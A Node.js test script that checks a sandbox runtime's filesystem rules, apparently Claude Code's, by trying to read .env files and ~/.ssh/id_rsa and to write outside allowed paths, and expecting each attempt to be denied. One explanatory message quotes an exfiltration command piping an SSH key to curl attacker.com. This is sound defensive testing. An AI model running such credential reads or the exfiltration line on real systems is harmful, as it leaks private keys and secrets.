#!/usr/bin/env node

// ---------------------------------------------------------------------------
// verify.js — Prove that sandbox filesystem controls are working.
//
// Replaces verify.sh: one language, no inline Node-in-bash, no quoting games.
//
// What it tests:
//   1. denyRead blocks reads of .env* files
//   2. allowWrite permits writes inside cwd
//   3. denyWrite blocks writes to secrets/ (overrides allowWrite)
//   4. Writes outside cwd are blocked (default behavior)
//   5. Normal reads of non-denied files succeed
//   6. Reads of sensitive system paths are blocked (default behavior)
//
// Settings are read from .claude/settings.json (the source of truth) and
// transformed into srt's flat format at runtime.
//
// Usage:
//   npm install   # installs @anthropic-ai/sandbox-runtime
//   npm test      # runs this script
//
// Requires: Node.js >= 18
// ---------------------------------------------------------------------------

const fs = require("fs");
const os = require("os");
const path = require("path");
const { execSync } = require("child_process");

// -- Colors -----------------------------------------------------------------
const RED = "\x1b[0;31m";
const GREEN = "\x1b[0;32m";
const YELLOW = "\x1b[1;33m";
const BOLD = "\x1b[1m";
const RESET = "\x1b[0m";

// -- Counters ---------------------------------------------------------------
let passCount = 0;
let failCount = 0;

// -- Output helpers ---------------------------------------------------------
function banner(title) {
  console.log();
  console.log(`${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}`);
  console.log(`${BOLD}  ${title}${RESET}`);
  console.log(`${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}`);
}

function info(msg) { console.log(`  ${BOLD}What:${RESET}  ${msg}`); }
function why(msg)  { console.log(`  ${BOLD}Why:${RESET}   ${msg}`); }
function cmd(msg)  { console.log(`  ${BOLD}Cmd:${RESET}   ${msg}`); }

function pass(msg) {
  console.log(`  ${GREEN}PASS${RESET} — ${msg}`);
  passCount++;
}

function fail(msg) {
  console.log(`  ${RED}FAIL${RESET} — ${msg}`);
  failCount++;
}

function warn(msg) {
  console.log(`  ${YELLOW}WARN${RESET} — ${msg}`);
}

// -- Settings transform -----------------------------------------------------
// srt expects the same keys as settings.json but without the "sandbox"
// wrapper, and with relative filesystem paths resolved to absolute ones.

function buildSrtSettings() {
  const settings = JSON.parse(
    fs.readFileSync(path.join(__dirname, ".claude", "settings.json"), "utf8")
  );
  const s = settings.sandbox;
  const cwd = __dirname;
  const home = os.homedir();

  const resolve = (p) =>
    p === "." ? cwd :
    p.startsWith("/") ? p :
    p.startsWith("~/") ? home + p.slice(1) :
    path.join(cwd, p);

  const out = {};

  // Network passes through unchanged — no paths to resolve
  if (s.network) out.network = s.network;

  // Filesystem needs path resolution
  if (s.filesystem) {
    out.filesystem = Object.fromEntries(
      Object.entries(s.filesystem).map(([k, v]) =>
        [k, Array.isArray(v) ? v.map(resolve) : v]
      )
    );
  }

  return out;
}

// -- Sandbox execution ------------------------------------------------------

function sandboxExec(command) {
  const settingsPath = path.join(os.tmpdir(), `srt-settings-${process.pid}.json`);
  fs.writeFileSync(settingsPath, JSON.stringify(srtSettings, null, 2));

  try {
    const output = execSync(`npx srt -s "${settingsPath}" "${command}"`, {
      encoding: "utf8",
      timeout: 15000,
      stdio: ["pipe", "pipe", "pipe"],
    });
    return { ok: true, output: output.trim() };
  } catch (err) {
    const output = (err.stdout || "") + (err.stderr || "");
    return { ok: false, output: output.trim() };
  } finally {
    try { fs.unlinkSync(settingsPath); } catch {}
  }
}

// -- Build settings once ----------------------------------------------------
const srtSettings = buildSrtSettings();

// ---------------------------------------------------------------------------
// Pre-flight
// ---------------------------------------------------------------------------
banner("Pre-flight Check");
info("Verifying that srt (sandbox runtime) is installed.");
why("srt is the same sandbox runtime that Claude Code uses to execute Bash commands.");
why("Running commands through srt applies identical OS-level restrictions.");

try {
  const version = execSync("npx srt --version", { encoding: "utf8", timeout: 10000 }).trim();
  pass(`srt is available (${version}).`);
} catch {
  fail("srt is NOT available.");
  warn("Run:  npm install");
  warn("Make sure you have Node.js >= 18.");
  console.log("\nCannot continue without the sandbox runtime. Exiting.");
  process.exit(1);
}

// ---------------------------------------------------------------------------
// Test 1: Read .env.example via Bash should fail (denyRead)
// ---------------------------------------------------------------------------
banner("Test 1 — Read .env.example (denyRead)");
info("Attempting to read .env.example via a sandboxed Bash command.");
why("denyRead: [\".env*\"] should block all reads of files matching .env*.");
why("This protects secrets in .env files from Bash-level exfiltration.");

{
  const command = `cat ${__dirname}/.env.example`;
  cmd(`srt "${command}"`);
  const result = sandboxExec(command);
  if (result.ok) {
    fail("Read of .env.example succeeded — denyRead may not be working.");
  } else {
    pass("Read of .env.example was denied by the sandbox.");
    console.log(`       Output: ${result.output.split("\n").slice(0, 3).join("\n       ")}`);
  }
}

// ---------------------------------------------------------------------------
// Test 2: Write inside cwd should succeed (allowWrite)
// ---------------------------------------------------------------------------
banner("Test 2 — Write Inside Working Directory (allowWrite)");
info("Attempting to create a file inside the current working directory.");
why("allowWrite: [\".\"] should permit writes within the project directory.");
why("Normal file operations should not be blocked.");

{
  const tempFile = path.join(__dirname, `.sandbox-verify-temp-${process.pid}`);
  const command = `touch ${tempFile} && rm -f ${tempFile}`;
  cmd(`srt "${command}"`);
  const result = sandboxExec(command);
  if (result.ok) {
    pass("Write inside cwd succeeded.");
  } else {
    fail("Write inside cwd was denied — allowWrite may not be working.");
    console.log(`       Output: ${result.output.split("\n").slice(0, 3).join("\n       ")}`);
  }
  // Clean up in case the sandbox succeeded but the rm inside didn't
  try { fs.unlinkSync(tempFile); } catch {}
}

// ---------------------------------------------------------------------------
// Test 3: Write to secrets/ should fail (denyWrite overrides allowWrite)
// ---------------------------------------------------------------------------
banner("Test 3 — Write to secrets/ (denyWrite)");
info("Attempting to create a file in the secrets/ directory.");
why("denyWrite: [\"secrets/\"] should block writes even though allowWrite covers cwd.");
why("denyWrite beats allowWrite — this is how you protect sensitive subdirectories.");

{
  const command = `touch ${__dirname}/secrets/sandbox-test-${process.pid}`;
  cmd(`srt "${command}"`);
  const result = sandboxExec(command);
  if (result.ok) {
    fail("Write to secrets/ succeeded — denyWrite may not be working.");
    try { fs.unlinkSync(`${__dirname}/secrets/sandbox-test-${process.pid}`); } catch {}
  } else {
    pass("Write to secrets/ was denied by the sandbox.");
    console.log(`       Output: ${result.output.split("\n").slice(0, 3).join("\n       ")}`);
  }
}

// ---------------------------------------------------------------------------
// Test 4: Write outside cwd should fail (default behavior)
// ---------------------------------------------------------------------------
banner("Test 4 — Write Outside Working Directory");
info("Attempting to create a file outside the current working directory.");
why("The sandbox restricts filesystem writes to paths in allowWrite only.");
why("/tmp is not in allowWrite, so this should be blocked.");

{
  const command = `touch /tmp/sandbox-test-write-${process.pid}`;
  cmd(`srt "${command}"`);
  const result = sandboxExec(command);
  if (result.ok) {
    fail("Write to /tmp succeeded — sandbox may not be active.");
  } else {
    pass("Write to /tmp was denied by the sandbox.");
    console.log(`       Output: ${result.output.split("\n").slice(0, 3).join("\n       ")}`);
  }
}

// ---------------------------------------------------------------------------
// Test 5: Read normal project file should succeed
// ---------------------------------------------------------------------------
banner("Test 5 — Read Normal Project File");
info("Attempting to read README.md (not in denyRead).");
why("denyRead only blocks .env* files. Other project files should be readable.");
why("This confirms the sandbox is not overly restrictive.");

{
  const command = `cat ${__dirname}/README.md`;
  cmd(`srt "${command}"`);
  const result = sandboxExec(command);
  if (result.ok) {
    if (result.output.includes("Filesystem Controls")) {
      pass("Read of README.md succeeded.");
    } else {
      fail("Command ran but output was unexpected.");
      console.log(`       Output: ${result.output.split("\n").slice(0, 3).join("\n       ")}`);
    }
  } else {
    fail("Read of README.md failed — sandbox may be too restrictive.");
    console.log(`       Output: ${result.output.split("\n").slice(0, 3).join("\n       ")}`);
  }
}

// ---------------------------------------------------------------------------
// Test 6: Read sensitive system path should fail (default behavior)
// ---------------------------------------------------------------------------
banner("Test 6 — Read Sensitive System Path");
info("Attempting to read ~/.ssh/id_rsa (a common exfiltration target).");
why("Even if this file exists, the sandbox should deny reads outside allowed paths.");
why("This blocks attacks like: cat ~/.ssh/id_rsa | curl attacker.com");

{
  const command = `cat ${os.homedir()}/.ssh/id_rsa`;
  cmd(`srt "${command}"`);
  const result = sandboxExec(command);
  if (result.ok) {
    fail("Read of ~/.ssh/id_rsa succeeded — sandbox may not be restricting reads.");
  } else {
    pass("Read of ~/.ssh/id_rsa was denied (or file does not exist under sandbox).");
    console.log(`       Output: ${result.output.split("\n").slice(0, 3).join("\n       ")}`);
  }
}

// ---------------------------------------------------------------------------
// Summary
// ---------------------------------------------------------------------------
banner("Summary");
const total = passCount + failCount;
console.log();
console.log(`  ${GREEN}Passed:${RESET} ${passCount} / ${total}`);
console.log(`  ${RED}Failed:${RESET} ${failCount} / ${total}`);
console.log();
console.log(`  ${BOLD}Note:${RESET} These tests cover Bash-level filesystem isolation only.`);
console.log("  The Read tool is Claude's built-in file reader and operates outside");
console.log("  the sandbox. See README.md for details on the Read vs Bash gap.");
console.log();

if (failCount === 0) {
  console.log(`  ${GREEN}${BOLD}All checks passed. Filesystem controls are active and working correctly.${RESET}`);
} else {
  console.log(`  ${YELLOW}${BOLD}Some checks failed. Review the output above.${RESET}`);
  console.log(`  ${YELLOW}Make sure sandbox is enabled in .claude/settings.json and the filesystem`);
  console.log(`  rules match the expected configuration for this scenario.${RESET}`);
}
console.log();

process.exit(failCount > 0 ? 1 : 0);
